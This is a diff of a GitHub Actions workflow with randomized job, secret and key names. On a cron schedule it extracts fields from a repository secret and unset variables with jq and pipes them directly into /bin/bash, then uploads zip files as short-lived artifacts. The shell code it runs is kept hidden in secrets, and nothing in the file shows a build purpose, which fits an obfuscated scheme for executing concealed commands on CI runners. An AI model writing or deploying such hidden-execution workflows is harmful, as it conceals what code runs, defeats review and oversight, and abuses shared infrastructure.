@@ -1,24 +1,28 @@
 name: shihuanyuege
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '40 4/6 * * *'
-jobs:  # 753
+    - cron: '18 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shihuanyuege
         env:
-          o6: ${{ secrets.o6 }}
+          o80411: ${{ secrets.o80411 }}
         run: |
-          echo $o6 | jq -r .dkv48 | /bin/bash
-          echo $xft07 | jq -r .fb3 | /bin/bash
-          echo $mnvn7340 | jq -r .zvzje624 | /bin/bash
-          echo $urw82 | jq -r .c29734 | /bin/bash
-          echo $x1 | jq -r .wpb48961 | /bin/bash
-          echo $iwzv6344 | jq -r .uhew83 | /bin/bash
-          echo $ik7 | jq -r .lg2 | /bin/bash
-          echo $srmle40318 | jq -r .djmrj8 | /bin/bash
-          echo $qpp23246 | jq -r .kc3948 | /bin/bash
+          printf '%s' "$o80411" | jq -r .ug48966 | /bin/bash
+          echo $jvj59315 | jq -r .p14 | /bin/bash
+          printf '%s' "$nqwgv8" | jq -r .hwu37662 | /bin/bash
+          printf '%s' "$tm5663" | jq -r .evtq88157 | /bin/bash
+          printf '%s' "$uv73" | jq -r .c452 | /bin/bash
+          echo $trke5050 | jq -r .bm7971 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZA30rYyz
+          path: "*.zip"
+          retention-days: 1
